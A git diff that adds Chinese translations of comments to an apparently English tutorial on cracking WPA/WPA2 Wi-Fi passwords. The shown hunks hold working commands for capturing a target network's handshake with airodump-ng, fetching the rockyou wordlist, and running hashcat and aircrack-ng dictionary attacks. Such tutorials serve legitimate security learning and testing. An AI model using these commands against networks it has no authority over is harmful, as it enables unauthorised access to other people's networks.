@@ -101,7 +101,9 @@ WPA/WPA2使用[4路握手](https://security.stackexchange.com/questions/17767/fo
 
 ```bash
 # replace -c and --bssid values with the values of your target network
+# 将-c以及--bssid值替换为你的目标网络值
 # -w specifies the directory where we will save the packet capture
+# -w制订了我们保存捕获数据包保存的文件夹
 airodump-ng -c 3 --bssid 9C:5C:8E:C9:AB:C0 -w . mon0
 ```
 ```
@@ -149,13 +151,17 @@ Next, download and run `naive-hashcat`:
 
 ```bash
 # download
+# 下载
 git clone https://github.com/brannondorsey/naive-hashcat
 cd naive-hashcat
 
 # download the 134MB rockyou dictionary file
+# 下载134MBrockyou字典文件
 curl -L -o dicts/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
 
 # crack ! baby ! crack !
+# 破解！宝贝！破解！
+# 2500是hashcat对于WPA/WPA2的哈希模式
 # 2500 is the hashcat hash mode for WPA/WPA2
 HASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh
 ```
@@ -181,6 +187,7 @@ Aircrack-ng可以用于在你的CPU上运行来进行非常基本的字典攻击
 
 ```bash
 # download the 134MB rockyou dictionary file
+# 下载134MBrockyou字典文件
 curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
 ```
 
@@ -189,6 +196,7 @@ Note, that if the network password is not in the wordfile you will not crack the
 
 ```bash
 # -a2 specifies WPA2, -b is the BSSID, -w is the wordfile
+# -a2指定WPA2，-b是BSSID，-w是单词文件
 aircrack-ng -a2 -b 9C:5C:8E:C9:AB:C0 -w rockyou.txt hackme.cap
 ```
 
